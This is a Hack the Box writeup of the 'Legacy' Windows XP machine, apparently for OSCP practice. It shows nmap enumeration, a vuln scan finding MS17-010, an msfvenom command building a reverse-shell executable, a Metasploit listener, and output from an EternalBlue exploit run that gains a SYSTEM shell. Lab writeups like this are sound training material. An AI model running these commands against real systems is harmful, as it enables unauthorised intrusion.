---
layout: post
layout: default
title: "Legacy"
description: "My writeup for the HacktheBox Legacy Machine, another simple box that requires exploiting Eternal Blue on Windows XP."
category_string: "Hack the Box (HTB)"
custom_css: ['blogs']
---

# Contents
- [Overview](#overview)
  - [Ratings](#ratings)
- [Tags](#tags)
- [Enumeration](#enumeration)
  - [nmap](#nmap)
- [Eternal Blue](#eternal-blue)
- [Key Lessons](#key-lessons)

# Overview

This is the second box in my OSCP prep series.

**Box Details**

|IP|User-Rated Difficulty|OS|Date Started|Date Completed|
|---|---|---|---|---|
|10.10.10.4|2.5|Windows (XP)|2021-05-02|2021-05-02|

---

This box was also super simple. It involved exploiting Eternal Blue on an old Windows XP machine. The only difference between it and [Blue](https://mac-goodwin.com/blog/htb/2021/05/01/htb-blue.html) was the operating system and SMB username. I had rooted it within 40 minutes, and a good chunk of that time was spent documenting the process.

## Ratings

I rated both user and root a 1 for difficulty. The exploit was incredibly simple, and there was no privesc involved.

# Tags

#writeup #oscp-prep #windows #cve #no-metasploit

# Enumeration

## nmap

I started out with the standard `nmap` scan, using `-Pn` to not send ping probes:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ nmap -v -sC -sV -Pn -oA nmap/ 10.10.10.4
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 10:15 BST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:15
Completed NSE at 10:15, 0.00s elapsed
Initiating NSE at 10:15
Completed NSE at 10:15, 0.00s elapsed
Initiating NSE at 10:15
Completed NSE at 10:15, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:15
Completed Parallel DNS resolution of 1 host. at 10:15, 0.02s elapsed
Initiating Connect Scan at 10:15
Scanning 10.10.10.4 [1000 ports]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Completed Connect Scan at 10:15, 6.23s elapsed (1000 total ports)
Initiating Service scan at 10:15
Scanning 2 services on 10.10.10.4
Completed Service scan at 10:15, 6.10s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.4.
Initiating NSE at 10:15
Completed NSE at 10:16, 50.97s elapsed
Initiating NSE at 10:16
Completed NSE at 10:16, 0.00s elapsed
Initiating NSE at 10:16
Completed NSE at 10:16, 0.00s elapsed
Nmap scan report for 10.10.10.4
Host is up (0.027s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h31m33s, deviation: 2h07m16s, median: 4d23h01m33s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c3:64 (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-05-07T14:17:22+03:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
Initiating NSE at 10:16
Completed NSE at 10:16, 0.00s elapsed
Initiating NSE at 10:16
Completed NSE at 10:16, 0.00s elapsed
Initiating NSE at 10:16
Completed NSE at 10:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.23 seconds
```

This reveals the box name to be `LEGACY` and the Operating System to be Windows XP. The only ports open are 139 for `netbios` and 445 for `SMB`.

While this was running, in another pane I started a full port scan with a `sleep 300` so it would start after five minutes:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ nmap -Pn -p- -oA nmap/all-ports 10.10.10.4
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 10:21 BST
Nmap scan report for 10.10.10.4
Host is up (0.020s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 118.06 seconds
```

There were no new ports.

As this was an old operating system and port 445 was open, I ran a `vuln` nmap scan to check if the system was vulnerable to [Eternal Blue](#cve-2017-0143):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ nmap -Pn --script vuln 10.10.10.4 -p 445
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 10:19 BST
Nmap scan report for 10.10.10.4
Host is up (0.030s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 24.65 seconds
```

Sure enough, it was!

# Eternal Blue

We already had an exploit we could use from when we did [Blue](#writeups/hack-the-box/boxes/blue/10---eternal-blue).

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ cp ../blue/exploit.py .
```

The only thing we needed to potentially change was the username. I checked the `nmap` scan, and it showed no username was used to login.

I quickly tried connecting to port 445 to check this behaviour was correct. I wanted to list the shares so I knew which one to connect to, but all of the methods I tried gave a timeout error:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbclient -L \\10.10.10.4
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbclient -L 10.10.10.4 \\\\legacy\\shares
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
```

So I just tried connecting with `smbmap`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbmap -H 10.10.10.4 -u "" -p ""
[+] IP: 10.10.10.4:445	Name: 10.10.10.4                                        
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbmap -H 10.10.10.4 -u null -p ""
[!] Authentication error on 10.10.10.4
```

It looks like giving a literal blank username is what we want. So I edited `exploit.py`:

![](/assets/images/blogs/Pasted image 20210502103619.png)

I also had to copy across `mysmb.py`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ cp ../blue/mysmb.py .
```

Then I needed a payload. I did a search for windows payloads to see if there were any specific Windows XP ones:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ msfvenom -l payload | grep windows
```

It looked like there weren't, so I went for the most generic one:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9001 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

I then edited the script to upload the new payload:

![](/assets/images/blogs/Pasted image 20210502104328.png)

I then started a listener:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ msfconsole -q
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:9001 
```

I wanted to see if the exploit worked without selecting a named pipe in advance, as it seemed to have a method to find one. So I ran it just specifying the IP:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ python2 exploit.py 10.10.10.4
Target OS: Windows 5.1
Using named pipe: spoolss
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8209e3c8
SESSION: 0xe10af840
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe11ffcf8
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe11ffd98
overwriting token UserAndGroups
Opening SVCManager on 10.10.10.4.....
Creating service WtPn.....
Starting service WtPn.....
The NETBIOS connection with the remote host timed out.
Removing service WtPn.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

And I got a shell almost instantly:

![](/assets/images/blogs/Pasted image 20210502104816.png)

It seems `whoami` wasn't a command on Windows XP. I tried:

```bash
C:\WINDOWS\system32>echo %USERNAME%
echo %USERNAME%
%USERNAME%
```

But got nothing. So I just went digging for the flags instead.

![](/assets/images/blogs/Pasted image 20210502105024.png)

![](/assets/images/blogs/Pasted image 20210502105053.png)

That's the box!

![](/assets/images/blogs/Pasted image 20210502105629.png)

# Key Lessons

Here are some of the key things I learned on this box:
- Modifying Eternal Blue to use blank usernames when connecting to SMB
- Using Eternal Blue against Windows XP machines

